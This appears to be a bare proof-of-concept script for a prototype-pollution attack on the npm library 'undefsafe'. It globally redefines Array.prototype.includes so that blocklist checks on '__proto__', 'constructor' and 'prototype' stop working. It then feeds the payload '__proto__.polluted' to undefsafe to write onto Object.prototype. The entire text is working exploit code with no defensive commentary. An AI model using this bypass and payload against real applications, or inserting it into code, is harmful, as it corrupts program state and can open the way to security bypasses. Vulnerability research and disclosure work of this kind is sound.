Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const a = require('undefsafe');
const obj = {};
const payload = '__proto__.polluted';
a({}, payload, 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');